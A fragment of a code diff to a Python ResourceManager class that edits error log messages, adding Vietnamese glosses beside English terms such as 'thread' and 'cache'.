+                self.logger.error(f"Lỗi khi join **[thread]** (luồng) {w.name}: {e}")
 
         self.logger.info("Dừng ResourceManager... (HOÀN THÀNH)")
     
@@ -1187,7 +1187,7 @@ class ResourceManager(IResourceManager):
         try:
             return self.shared_resource_manager.strategy_cache.get_metrics()
         except Exception as e:
-            self.logger.error(f"❌ [CacheReport] Failed to get cache metrics: {e}")
+            self.logger.error(f"❌ [CacheReport] Failed to get **[cache]** (bộ nhớ đệm) metrics: {e}")
             return {
                 'error': str(e),
                 'timestamp': time.time(),
